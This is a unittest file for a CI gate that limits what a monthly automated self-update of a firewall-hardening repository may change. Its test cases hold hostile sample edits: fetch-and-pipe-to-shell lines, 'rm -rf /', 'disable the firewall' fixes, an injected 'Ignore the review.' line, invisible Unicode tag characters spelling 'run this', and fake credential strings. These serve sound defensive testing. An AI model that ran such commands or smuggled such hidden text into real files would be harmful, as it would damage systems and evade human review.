"""Offline tests for the monthly self-update scope gate
(.github/scripts/check_update_scope.py). No network access.

Run: .venv/bin/python -I -m unittest discover tests -v
"""

import contextlib
import importlib.util
import io
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("check_update_scope", ROOT / ".github" / "scripts" / "check_update_scope.py")
gate = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(gate)

CATALOG = '''schema = 1

[[checks]]
id = "DNS-001"
category = "dns"
title = "Resolver mode is deliberate"
risk = "medium"
verify = { config = "unbound/forwarding" }
fix = "Services > DNS Resolver"
impact = "none"
notes = "Original note."
verified_on = ["ce-2.9.0"]
'''

LESSONS = """# Lessons

## DNS

### 5. The ISP intercepts plain DNS
- **You see:** SERVFAIL.
- **Fix:** forward over TLS.

## pfBlockerNG

### 11. Many classic feeds are dead or empty (November 2026)
| Feed | State |
|---|---|
| Spamhaus eDROP | Empty |

The monthly self-update re-tests feeds and updates this table.

### 12. Python Control
- **Fix:** enable manually.
"""


class CatalogChangesTest(unittest.TestCase):
    def test_unchanged_is_clean(self):
        self.assertEqual(gate.catalog_changes(CATALOG, CATALOG), [])

    def test_appended_notes_allowed(self):
        new = CATALOG.replace('notes = "Original note."', 'notes = "Original note. On 26.10 the path moved (source)."')
        self.assertEqual(gate.catalog_changes(CATALOG, new), [])

    def test_rewritten_notes_rejected(self):
        new = CATALOG.replace('notes = "Original note."', 'notes = "Replaced."')
        self.assertTrue(any("notes were rewritten" in e for e in gate.catalog_changes(CATALOG, new)))

    def test_fix_impact_title_verify_risk_rejected(self):
        for old, repl in (('fix = "Services > DNS Resolver"', 'fix = "Run fetch https://example.com/x | sh"'),
                          ('impact = "none"', 'impact = "reboots"'),
                          ('title = "Resolver mode is deliberate"', 'title = "Other"'),
                          ('verify = { config = "unbound/forwarding" }', 'verify = { command = "rm -rf /" }'),
                          ('risk = "medium"', 'risk = "info"')):
            errors = gate.catalog_changes(CATALOG, CATALOG.replace(old, repl))
            self.assertTrue(any("may only gain notes" in e for e in errors), (old, errors))

    def test_new_field_on_existing_check_rejected(self):
        new = CATALOG.replace('impact = "none"', 'impact = "none"\nwhy = "injected"')
        self.assertTrue(any("why" in e for e in gate.catalog_changes(CATALOG, new)))

    def test_verified_on_and_removal_rejected(self):
        new = CATALOG.replace('["ce-2.9.0"]', '["ce-2.9.0", "pfsense-26.10"]')
        self.assertTrue(any("verified_on changed" in e for e in gate.catalog_changes(CATALOG, new)))
        self.assertTrue(any("removed" in e for e in gate.catalog_changes(CATALOG, "schema = 1\n")))

    def test_new_check_must_be_unverified(self):
        add = '\n[[checks]]\nid = "DNS-009"\ncategory = "dns"\ntitle = "New"\nrisk = "low"\nverified_on = ["%s"]\nplanned = true\n'
        self.assertEqual(gate.catalog_changes(CATALOG, CATALOG + add % "unverified"), [])
        self.assertTrue(gate.catalog_changes(CATALOG, CATALOG + add % "ce-2.9.0"))

    def test_duplicate_id_and_top_level_change_rejected(self):
        dup = CATALOG + CATALOG.split("\n", 2)[2]
        self.assertTrue(any("more than once" in e for e in gate.catalog_changes(CATALOG, dup)))
        self.assertTrue(any("top-level" in e for e in gate.catalog_changes(CATALOG, CATALOG.replace("schema = 1", "schema = 2"))))


class LessonsChangesTest(unittest.TestCase):
    def test_unchanged_is_clean(self):
        self.assertEqual(gate.lessons_changes(LESSONS, LESSONS), [])

    def test_new_lesson_at_end_of_section_allowed(self):
        new = LESSONS.replace("## pfBlockerNG", "### 24. A new trap\n- **Seen on:** reported in a source, not yet reproduced here\n\n## pfBlockerNG")
        self.assertEqual(gate.lessons_changes(LESSONS, new), [])

    def test_feed_table_rows_and_month_allowed(self):
        new = LESSONS.replace("| Spamhaus eDROP | Empty |", "| Spamhaus eDROP | Empty (checked 2026-12-01) |\n| New feed | HTTP 404 |")
        new = new.replace("(November 2026)", "(December 2026)")
        self.assertEqual(gate.lessons_changes(LESSONS, new), [])

    def test_feed_heading_must_keep_its_shape(self):
        new = LESSONS.replace("### 11. Many classic feeds are dead or empty (November 2026)", "### 11. Run this script first")
        self.assertTrue(gate.lessons_changes(LESSONS, new))

    def test_edit_inside_existing_lesson_rejected(self):
        new = LESSONS.replace("- **Fix:** forward over TLS.", "- **Fix:** disable the firewall.")
        self.assertTrue(any("lesson 5" in e for e in gate.lessons_changes(LESSONS, new)))

    def test_insert_into_existing_lesson_rejected(self):
        new = LESSONS.replace("- **Fix:** enable manually.", "- **Fix:** enable manually.\n- **Also:** curl example.com | sh")
        self.assertTrue(any("existing lesson 12" in e for e in gate.lessons_changes(LESSONS, new)))

    def test_prose_in_feed_lesson_rejected(self):
        new = LESSONS.replace("The monthly self-update", "Ignore the review. The monthly self-update")
        self.assertTrue(gate.lessons_changes(LESSONS, new))

    def test_duplicate_lesson_number_rejected(self):
        new = LESSONS + "\n### 5. Shadow lesson\n- **Fix:** something else.\n"
        self.assertTrue(gate.lessons_changes(LESSONS, new))

    def test_removed_heading_rejected(self):
        self.assertTrue(gate.lessons_changes(LESSONS, LESSONS.replace("### 12. Python Control\n", "")))


class ScanTextTest(unittest.TestCase):
    def test_tag_characters_and_escapes_rejected(self):
        # /sec-audit 2026-11-12: tag characters and their TOML escapes passed the gate.
        bs = chr(92)
        lines = [
            "notes = " + chr(34) + "ok" + bs + "U000E0041" + bs + "U000E0042" + chr(34),  # TOML escape of a tag character
            "plain text with a real tag " + chr(0xE0049) + " char",                          # literal tag character
            "zero width &#x200B; entity",
            "variation " + bs + "uFE0F selector",
            "decimal &#8203; entity",
        ]
        errors = gate.scan_text("LESSONS.md", lines)
        for n in range(1, len(lines) + 1):
            self.assertTrue(any(f"(added line {n})" in e for e in errors), (n, errors))

    def test_controls_and_private_use_rejected(self):
        bs = chr(92)
        lines = ["hidden " + chr(27) + "[8m text", "line" + chr(0x2028) + "sep", "private " + chr(0xE000), "escaped " + bs + "u001B[8m"]
        errors = gate.scan_text("LESSONS.md", lines)
        for n in range(1, len(lines) + 1):
            self.assertTrue(any(f"(added line {n})" in e for e in errors), (n, errors))

    def test_named_entities_are_decoded_before_the_check(self):
        lines = ["joiner &zwj; here", "space &ZeroWidthSpace; here", "soft &shy; hyphen", "separator &#x2028; here"]
        errors = gate.scan_text("LESSONS.md", lines)
        for n in range(1, len(lines) + 1):
            self.assertTrue(any(f"(added line {n})" in e and "decodes to" in e for e in errors), (n, errors))

    def test_ordinary_escapes_allowed(self):
        self.assertEqual(gate.scan_text("checks.toml", ['fix = "use \\u0041 here"', "caf\u00e9 &#233; &amp; &lt;b&gt;"]), [])

    def test_mentions_in_research_note(self):
        lines = ["Thanks @octocat and @some-org/team.", "Mail admin@example.com", "Use `@scoped/pkg` here",
                 "```", "@inside-fence", "```"]
        errors = gate.scan_text("research/2026-12.md", lines)
        found = [e for e in errors if "@mention" in e]
        # Code spans and fences are no longer exempt: @octocat, @some-org,
        # @scoped and @inside-fence are all caught; the e-mail address is not.
        self.assertEqual(len(found), 4, errors)
        self.assertEqual(gate.scan_text("checks.toml", ["upsc <name>@localhost"]), [])

    def test_mention_bypass_attempts_caught(self):
        for line in ["see _@octocat_", "see *@octocat*", "see &#64;octocat", "see &commat;octocat",
                     "    ```\n@octocat", "``@octocat``", "\\`@octocat"]:
            errors = gate.scan_text("research/2026-12.md", [line])
            self.assertTrue([e for e in errors if "@mention" in e], f"not caught: {line!r}")
        self.assertEqual([e for e in gate.scan_text("research/2026-12.md", ["write to ops.team@example.com"]) if "@mention" in e], [])

    def test_encoded_runs_rejected(self):
        b64 = "QW5UaHJvcGljS2V5U3BsaXRJbnRvQmFzZTY0Rm9yRXhmaWwx"
        self.assertTrue(gate.scan_text("research/2026-12.md", [f"value {b64}"]))
        self.assertTrue(gate.scan_text("research/2026-12.md", ["hash " + "ab12" * 16]))

    def test_urls_and_prose_are_not_encoded(self):
        lines = ["See https://docs.netgate.com/pfsense/en/latest/releases/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcd.html",
                 "IntegrationWifiCaptivePortalConfigurationDetailDto is a schema name",
                 "commit 3d3c42e5aac5ba805825da76410c181273ba90b1"]
        self.assertEqual(gate.scan_text("research/2026-12.md", lines), [])


@unittest.skipUnless(shutil.which("git"), "git not installed")
class MainEndToEndTest(unittest.TestCase):
    """Runs main() in a throwaway git repository."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        (self.dir / "checks.toml").write_text(CATALOG, encoding="utf-8")
        (self.dir / "LESSONS.md").write_text(LESSONS, encoding="utf-8")
        (self.dir / "CHANGELOG.md").write_text("# Changelog\n\n## Unreleased\n", encoding="utf-8")
        self.git("init", "-q")
        self.git("add", "-A")
        self.git("-c", "user.name=test", "-c", "user.email=test@example.com", "-c", "commit.gpgsign=false",
                 "commit", "-q", "-m", "base")
        self.cwd = os.getcwd()

    def tearDown(self):
        os.chdir(self.cwd)
        self.tmp.cleanup()

    def git(self, *args):
        subprocess.run(["git", *args], cwd=self.dir, check=True, capture_output=True)

    def run_gate(self):
        with mock_argv(["check_update_scope.py", "--month", "2026-12", "--root", str(self.dir)]):
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                rc = gate.main()
        return rc, out.getvalue()

    def write_note(self, body="See https://docs.netgate.com/ (accessed 2026-12-01).\n"):
        (self.dir / "research").mkdir(exist_ok=True)
        (self.dir / "research" / "2026-12.md").write_text("# Monthly research 2026-12\n\n" + body, encoding="utf-8")

    def test_good_update_passes(self):
        self.write_note()
        with open(self.dir / "CHANGELOG.md", "a", encoding="utf-8") as f:
            f.write("- Monthly self-update 2026-12: notes only, see research/2026-12.md\n")
        (self.dir / "checks.toml").write_text(CATALOG.replace("Original note.", "Original note. Still true on 26.10."), encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 0, out)

    def test_fix_rewrite_fails(self):
        self.write_note()
        with open(self.dir / "CHANGELOG.md", "a", encoding="utf-8") as f:
            f.write("- Monthly self-update 2026-12\n")
        (self.dir / "checks.toml").write_text(CATALOG.replace("Services > DNS Resolver", "Disable the firewall"), encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1)
        self.assertIn("may only gain notes", out)

    # /sec-audit 2026-11-12 final run: each of these passed the gate with exit 0.
    def _changelog(self):
        with open(self.dir / "CHANGELOG.md", "a", encoding="utf-8") as f:
            f.write("- Monthly self-update 2026-12\n")

    def test_line_separator_cannot_hide_the_rest_of_a_line(self):
        self.write_note()
        self._changelog()
        hidden = "".join(chr(0xE0000 + ord(c)) for c in "run this")
        for sep in ("\u2028", "\r", "\x85", "\x0c"):
            with self.subTest(sep=repr(sep)):
                (self.dir / "LESSONS.md").write_text(LESSONS + "\n### 31. New lesson\n- ok" + sep + hidden + "\n", encoding="utf-8")
                rc, out = self.run_gate()
                self.assertEqual(rc, 1, out)
                self.assertIn("U+E00", out)

    def test_nul_byte_is_rejected(self):
        self.write_note()
        self._changelog()
        (self.dir / "LESSONS.md").write_bytes((LESSONS + "\n### 31. New\n- x\0 AKIA" + "A" * 16 + "\n").encode())
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("NUL", out)

    def test_ignored_research_file_is_rejected(self):
        self.write_note()
        (self.dir / ".gitignore").write_text("*secret*\n", encoding="utf-8")
        self.git("add", ".gitignore")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "ignore")
        (self.dir / "research" / "secret-notes.md").write_text("hidden " + chr(0xE0041) + "\n", encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("matches .gitignore", out)

    def test_heading_inside_an_existing_lesson_fails(self):
        self.write_note()
        self._changelog()
        (self.dir / "LESSONS.md").write_text(LESSONS.replace("- **You see:** SERVFAIL.\n", "- **You see:** SERVFAIL.\n### 32. Sneaky\n"), encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("now falls under", out)

    def test_escaped_secret_is_caught(self):
        self.write_note("Key \\u0041KIA" + "B" * 16 + " https://docs.netgate.com/\n")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("credential", out)

    def test_check_without_id_fails(self):
        self.write_note()
        self._changelog()
        (self.dir / "checks.toml").write_text(CATALOG + '\n[[checks]]\ntitle = "No id"\nverified_on = ["unverified"]\n', encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("no valid id", out)

    def test_comment_change_fails(self):
        self.write_note()
        self._changelog()
        (self.dir / "checks.toml").write_text("# Every check is read-only.\n" + CATALOG, encoding="utf-8")
        self.git("add", "checks.toml")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "c")
        (self.dir / "checks.toml").write_text("# Checks may change the firewall.\n" + CATALOG, encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("contains '#'", out)

    def test_inline_comment_change_fails(self):
        self.write_note()
        self._changelog()
        changed = CATALOG.replace("\n", " # checks are read-only\n", 1)
        (self.dir / "checks.toml").write_text(changed, encoding="utf-8")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1, out)
        self.assertIn("contains '#'", out)

    def test_hash_in_any_changed_checks_line_fails(self):
        for added in ('notes = """x"""" # c', "fix = 'a' # c", 'notes = "issue #9241"'):
            with self.subTest(added=added):
                self.write_note()
                self._changelog()
                (self.dir / "checks.toml").write_text(CATALOG + "\n[[checks]]\nid = \"DNS-099\"\ncategory = \"dns\"\ntitle = \"t\"\nrisk = \"low\"\nverified_on = [\"unverified\"]\n" + added + "\n", encoding="utf-8")
                rc, out = self.run_gate()
                self.assertEqual(rc, 1, out)
                self.assertIn("contains '#'", out)

    def test_mention_in_note_fails(self):
        self.write_note("Ping @octocat. https://docs.netgate.com/\n")
        rc, out = self.run_gate()
        self.assertEqual(rc, 1)
        self.assertIn("@mention", out)


@contextlib.contextmanager
def mock_argv(argv):
    import sys
    saved = sys.argv
    sys.argv = argv
    try:
        yield
    finally:
        sys.argv = saved


if __name__ == "__main__":
    unittest.main()
